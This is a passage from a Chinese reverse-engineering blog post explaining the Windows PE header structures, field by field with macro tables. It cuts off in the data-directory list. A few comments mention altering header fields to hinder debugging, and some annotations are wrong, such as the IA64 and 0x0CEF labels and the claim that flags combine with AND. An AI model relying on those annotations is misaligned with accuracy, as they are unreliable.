src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701194501594.png" alt="image-20250701194501594"></p><ul><li>其结构体就是这样(以32位为例子，先介绍32位的)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">  DWORD Signature; <span class="comment">// NT头的标识4字节,&quot;PE\x00\x00&quot; (0x4550 小端序就是0x50 0x45 0x00 0x00)</span></span><br><span class="line">  IMAGE_FILE_HEADER FileHeader; <span class="comment">// NT文件头</span></span><br><span class="line">  IMAGE_OPTIONAL_HEADER32 OptionalHeader; <span class="comment">// NT的选项头文件,为可执行文件指定选项</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><ul><li>下面是<code>NT</code>文件头文件格式的<code>16</code>进制分布</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701195743221.png" alt="image-20250701195743221"></p><h3 id="nt的文件头_file_headers">NT的文件头_FILE_HEADERS</h3><ul><li>依然是这张图片，其中标<code>CC</code>的就是可以利用的。</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701195743221.png" alt="image-20250701195743221"></p><ul><li>直接查看<code>vs</code>的<code>IMAGE_FILE_HEADER</code>的结构体</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701200007106.png" alt="image-20250701200007106"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span>&#123;</span></span><br><span class="line">    WORD Machine;<span class="comment">// 一个宏,表示该程序是什么架构的程序,包括MIPS小端序、Intel 386等不同架构的程序,之后会详细说明</span></span><br><span class="line">    WORD NumberOfSections;<span class="comment">// 描述节区总数也就是IMAGE_SECTION_HEADER个数</span></span><br><span class="line">    DWORD TimeDateStamp;<span class="comment">// 每个可执行文件产生的时间(可以参考,但是不可信,因为别人可以改)</span></span><br><span class="line">    DWORD PointerToSymbolTable;<span class="comment">// 指向COFF符号表的文件偏移(距离文件开头的字节数)</span></span><br><span class="line">    DWORD NumberOfSymbols;<span class="comment">// 符号表中包含的符号个数</span></span><br><span class="line">    WORD sizeOfOptionalHeader;<span class="comment">// 描述后面的IMAGE_OPTIONAL_HEADER32的大小</span></span><br><span class="line">    WORD Characteristics;<span class="comment">// 该可执行文件的属性,可以知道该程序是PE文件中的哪一种.exe、.dll、.sys</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><ul><li>注意如果合理修改了<code>sizeOfOptionalHeader</code>的值，其实程序是可以正常运行，但是程序可能不能进行动态调试，动态调试可能就会出现问题。</li></ul><h4 id="machin宏定义">Machin宏定义</h4><ul><li>上面<code>FILE_HEADER</code>中的<code>Machine</code>宏定义也可以在<code>VS</code>中能看到，某些宏定义可以经过<code>与</code>操作组合在一起</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701200837227.png" alt="image-20250701200837227"></p><ul><li>在上图中又几个比较重要和常见的架构宏定义</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_I386              0x014c  <span class="comment">// Intel 386架构</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_IA64              0x0200  <span class="comment">// Intel 64</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ARM               0x01c0  <span class="comment">// ARM 小端序</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_AMD64             0x8664  <span class="comment">// AMD64 (K8)</span></span></span><br></pre></td></tr></table></figure><ul><li>介绍一下这些宏定义在的架构和类型</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_RELOCS_STRIPPED           0x0001  <span class="comment">// 去掉了重定位信息（常见于绝对地址绑定的程序）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  <span class="comment">// 可执行映像(非obj)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  <span class="comment">// 去掉调试行号信息</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  <span class="comment">// 去掉局部符号表信息</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  <span class="comment">// 工作集裁剪标志</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  <span class="comment">// 程序能访问大于2GB的地址空间(主要在x64系统上)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_BYTES_REVERSED_LO         0x0080  <span class="comment">// 用于老系统检测字节序(低位反转)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_32BIT_MACHINE             0x0100  <span class="comment">// 32位程序</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_DEBUG_STRIPPED            0x0200  <span class="comment">// 去除调试信息</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  <span class="comment">// 来自可移动设备时,复制到交换文件运行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  <span class="comment">// 来自网络运行时,复制到交换文件运行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_SYSTEM                    0x1000  <span class="comment">// 标识该文件是系统文件(NTDLL、KERNEL32等).</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_DLL                       0x2000  <span class="comment">// 标识该文件是DLL类型的PE文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  <span class="comment">// 只能在但处理器机器上运行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_BYTES_REVERSED_HI         0x8000  <span class="comment">// 字节高位反转,比较少见,用于字节序检测</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_UNKNOWN           0 <span class="comment">// 表示未知架构</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_TARGET_HOST       0x0001  <span class="comment">// 用于宿主机而非虚拟化环境</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_I386              0x014c  <span class="comment">// Intel 386架构</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_R3000             0x0162  <span class="comment">// MIPS 小端序架构, 0x160为大端序架构</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_R4000             0x0166  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_R10000            0x0168  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_WCEMIPSV2         0x0169  <span class="comment">// MIPS little-endian WCE v2</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ALPHA             0x0184  <span class="comment">// Alpha_AXP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH3               0x01a2  <span class="comment">// SH3 little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH3DSP            0x01a3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH3E              0x01a4  <span class="comment">// SH3E 小端序</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH4               0x01a6  <span class="comment">// SH4 小端序</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH5               0x01a8  <span class="comment">// SH5</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ARM               0x01c0  <span class="comment">// ARM 小端序</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_THUMB             0x01c2  <span class="comment">// ARM Thumb/Thumb-2 小端序</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ARMNT             0x01c4  <span class="comment">// ARM Thumb-2 小端序</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_AM33              0x01d3 <span class="comment">// AM33 架构</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_POWERPC           0x01F0  <span class="comment">// IBM PowerPC Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_POWERPCFP         0x01f1 <span class="comment">// IBM PowerPC 架构</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_IA64              0x0200  <span class="comment">// Intel 64</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_MIPS16            0x0266  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ALPHA64           0x0284  <span class="comment">// ALPHA64</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU           0x0366  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU16         0x0466  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_AXP64             IMAGE_FILE_MACHINE_ALPHA64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_TRICORE           0x0520  <span class="comment">// Infineon</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_CEF               0x0CEF <span class="comment">// Infineon TriCore 架构 (混合型 RISC 架构处理器)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_EBC               0x0EBC  <span class="comment">// EFI Byte Code</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_AMD64             0x8664  <span class="comment">// AMD64 (K8)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_M32R              0x9041  <span class="comment">// M32R小端序</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ARM64             0xAA64  <span class="comment">// ARM64小端序</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_CEE               0xC0EE <span class="comment">// CEE虚拟机生成的可执行文件</span></span></span><br></pre></td></tr></table></figure><h3 id="nt的选项头文件_optional_header">NT的选项头文件_OPTIONAL_HEADER</h3><ul><li>选项头有三类<code>32位选项头</code>、<code>64位选项头</code>、<code>嵌入式选项头</code>。这里主要介绍<code>32位选项头</code>和<code>64</code>位选项头</li><li>从<code>FILE_HEADERS</code>倒数第<code>3、4</code>字节就可以得到<code>optional header</code>的大小，其实就是<code>0xE0</code>，从而得到<code>optional head</code>的那一块区域</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701210423532.png" alt="image-20250701210423532"></p><ul><li>先查看一下<code>IMAGE_OPTIONAL_HEADER32</code>的结构体</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701212448754.png" alt="image-20250701212448754"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个是32位的选项头重点介绍</span></span><br><span class="line"><span class="comment">// 其实32位的结构和64位头结构一样,只是关于地址描述部分WORD、DWORD和ULONGLONG(无符号长整型)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span>&#123;</span></span><br><span class="line">    WORD Magic;<span class="comment">//0x00类似于PE、MZ这样的识别,有三个宏定义.IMAGE_NT_OPTIONAL_HDR_MAGIC可执行文件,IMAGE_ROM_OPTIONAL_HDR_MAGIC在ROM的文件用作固件(一般是UEFI ROM、BIOS插件模块、或者是在嵌入式设备中的),IMAGE_NT_OPTIONAL_HDR64_MAGIC</span></span><br><span class="line">    BYTE MajorLinkerVersion; <span class="comment">// 链接器主版本号</span></span><br><span class="line">    BYTE MinorLinkerversion; <span class="comment">// 链接器次版本号</span></span><br><span class="line">    DWORD SizeOfCode;<span class="comment">// 当前可执行文件所包含代码的总大小</span></span><br><span class="line">    DWORD SizeOfInitializedData;<span class="comment">// 已初始化数据的总大小 .data 、.const已初始化</span></span><br><span class="line">    DWORD SizeOfUninitializedData;<span class="comment">// 未初始化数据的总大小 .data? 未初始化 (对应已初始化的数据程序编译的时候需要记录数据内容,对于未初始化的数据不要保留位置,只需要记录SizeOfUninitializedData即可)</span></span><br><span class="line">    <span class="comment">// 上面这3个sizeOf都是说明性的东西,可以任意修改不影响执行,但是可以干扰调试调试器(可以用于反调试)</span></span><br><span class="line">    DWORD AddressOfEntryPoint;<span class="comment">// 程序入口点地址,简称EP(当前入口点)。OEP(原始入口点),在加壳的时候这么称呼</span></span><br><span class="line">    DWORD BaseOfCode;<span class="comment">// 代码基地址,程序偏移多少字节到代码段地址开头</span></span><br><span class="line">    DWORD BaseOfData;<span class="comment">// 数据基地址,数据的起始地址</span></span><br><span class="line">    <span class="comment">//上面程序基地址和数据基地址都是可以被修改的,这种其实也是反调试的方法之一</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 以上这个部分是三个可选头共同的</span></span><br><span class="line">    DWORD ImageBase;<span class="comment">// (建议装载地址)程序默认的加载地址,如0x400000,方便操作系统重定位</span></span><br><span class="line">    DWORD SectionAlignment;<span class="comment">// 映像(内存中)每个节(Section)的对齐大小,通常为0x1000 </span></span><br><span class="line">    DWORD FileAlignment;<span class="comment">// 文件中每个节的对齐大小,通常为0x200,不满足0x200大小的就会补0</span></span><br><span class="line">    WORD MajorOperatingSystemVersion;<span class="comment">// 要求的最低操作系统主版本</span></span><br><span class="line">    WORD MinorOperatingSystemVersion;<span class="comment">// 要求的最低操作系统次版本</span></span><br><span class="line">    WORD MajorImageVersion;<span class="comment">// 应用程序自身主版本号(开发者填写)</span></span><br><span class="line">    WORD MinorImageVersion;<span class="comment">// 应用程序自身次版本号</span></span><br><span class="line">    WORD MajorSubsystemVersion;<span class="comment">// 所需子系统主版本</span></span><br><span class="line">    WORD MinorSubsystemVersion;<span class="comment">// 所需子系统次版本</span></span><br><span class="line">    DWORD Win32VersionValue;<span class="comment">// 通常为0,保留字段</span></span><br><span class="line">    DWORD SizeOfImage;<span class="comment">// 映像整体大小(对齐到SectionAlignment),用于加载时分配内存,必须对齐于SectionAlignment中的数据</span></span><br><span class="line">    DWORD SizeOfHeaders;<span class="comment">// 所有头部大小之和(DOS头+PE头+节表+可选头)</span></span><br><span class="line">    DWORD CheckSum;<span class="comment">// 可执行文件的校验和,用户程序一般不用检查校验和,如果是系统文件驱动等就需要检查校验和,判断其是否被修改或者出错误(3环的时候能利用,0环不能)</span></span><br><span class="line">    WORD Subsystem;<span class="comment">// 表示运行环境,GUI、Console、Native</span></span><br><span class="line">    WORD DllCharacteristics;<span class="comment">// DLL特性标志,例如ASLR、DEP支持等,如0x40动态重定位、NX兼容等</span></span><br><span class="line">    DWORD SizeOfStackReserve;<span class="comment">// 初始保留的栈空间大小</span></span><br><span class="line">    DWORD SizeOfStackCommit;<span class="comment">// 初始提交(分配)的栈空间</span></span><br><span class="line">    DWORD SizeOfHeapReserve;<span class="comment">// 初始保留的堆大小</span></span><br><span class="line">    DWORD SizeOfHeapCommit;<span class="comment">// 初始提交的堆大小</span></span><br><span class="line">    DWORD LoaderFlags;<span class="comment">// 保留字段,一般为0,可以自己写个值,在程序运行的时候读这个值</span></span><br><span class="line">    DWORD NumberOfRvaAndSizes;<span class="comment">// DataDirectory中有效条目数量(通常为16)</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="comment">//一个数组,每项是一个数据目录项,包括导入表、导出表、资源表、异常表</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"><span class="comment">// DataDirectory[0]位导出函数表DLL,DataDirectory[1]位导入函数表,DataDirectory[2]位资源</span></span><br><span class="line"><span class="comment">// DataDirectory[3]异常处理信息</span></span><br></pre></td></tr></table></figure><ul><li>对于<code>DWORD FileAlignment;</code>这个文件对齐，紫色框部分才是代码的部分，但是由于文件需要<code>0x200</code>字节对齐，所以剩余部分需要补充<code>\x00</code></li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250702012000846.png" alt="image-20250702012000846"></p><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250702200111516.png" alt="image-20250702200111516"></p><h4 id="sizeofheaders">SizeOfHeaders</h4><ul><li><code>SizeOfHeaders</code>指的是可执行文件的头部大小，从<code>SizeOfHeaders</code>中可以看出来<code>PE文件头大小为0x400</code>，这个<code>0x400</code>需要与<code>File_aligment</code>这里面的数据对齐(也就是需要满足0x200的整数倍)，由于我们的<code>Headers</code>大于<code>0x200</code>所以需要对齐到<code>0x400</code>也就是<code>Headers</code>头结束后，填充<code>\x00</code><strong>当做无效数据</strong></li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250702200521803.png" alt="image-20250702200521803"></p><h4 id="subsystem">Subsystem</h4><ul><li>主要介绍一下<code>Subsystem</code>中一些宏，这个字段可以改，但是需要合理的改。</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250702201441763.png" alt="image-20250702201441763"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_UNKNOWN              0   <span class="comment">// Unknown subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_NATIVE               1   <span class="comment">// Image doesn&#x27;t require a subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_GUI          2   <span class="comment">// 主要接触：Windows图形用户界面.Image runs in the Windows GUI subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_CUI          3   <span class="comment">// 主要接触：Windows控制台界面.Image runs in the Windows character subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_OS2_CUI              5   <span class="comment">// image runs in the OS/2 character subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_POSIX_CUI            7   <span class="comment">// image runs in the Posix character subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_NATIVE_WINDOWS       8   <span class="comment">// 主要接触：Windows内核驱动 image is a native Win9x driver.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_CE_GUI       9   <span class="comment">// Image runs in the Windows CE subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_APPLICATION      10  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER  11   <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER   12  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_ROM              13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_XBOX                 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_BOOT_APPLICATION 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_XBOX_CODE_CATALOG    17</span></span><br></pre></td></tr></table></figure><h4 id="dllcharacteristics">DllCharacteristics</h4><ul><li>关于<code>Dll</code>的属性描述</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0001</span> 保留字段</span><br><span class="line"><span class="number">0x0002</span>保留字段</span><br><span class="line"><span class="number">0x0004</span>保留字段</span><br><span class="line"><span class="number">0x0008</span>保留字段</span><br><span class="line"><span class="number">0x2000</span>A WDM driver 基于WDM的一个驱动程序</span><br></pre></td></tr></table></figure><h4 id="堆栈保留和提交">堆栈保留和提交</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD SizeOfStackReserve;<span class="comment">// 初始保留的栈空间大小,程序能向操作系统申请的最大栈内存</span></span><br><span class="line">DWORD SizeOfStackCommit;<span class="comment">// 初始提交(分配)的栈空间,程序一开始运行时需要先申请的栈大小</span></span><br><span class="line">DWORD SizeOfHeapReserve;<span class="comment">// 初始保留的堆大小,程序能向操作系统申请的最大堆内存</span></span><br><span class="line">DWORD SizeOfHeapCommit;<span class="comment">// 初始提交的堆大小,程序一开始运行时需要先申请的堆大小</span></span><br><span class="line"><span class="comment">// 该字段可以修改,但是需要合理修改。保留需要大于提交的大小,保留需要不超过OS的内存限制</span></span><br></pre></td></tr></table></figure><h3 id="image_data_directory">IMAGE_DATA_DIRECTORY</h3><ul><li><strong>数据目录</strong>是<code>PE</code>文件中的一个重要结构</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IMAGE_DATA_DIRECTORY的结构如下</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">// 表的虚拟地址</span></span><br><span class="line">    DWORD   Size;<span class="comment">// 表的大小</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><ul><li>数据目录数组对应的索引已经规定好了具体的数据表，下面就是具体数据表的宏定义</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// 重点:导出表Export Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// 重点:导入表Import Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// 重点:资源描述Resource Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// Exception Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// Security Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// 重点:重定位表Base Relocation Table</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// Debug Directory</span></span></span><br><span class="line"><span class="comment">//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   <span class="comment">// Architecture Specific Data</span></span></span><br><span class="line"><span 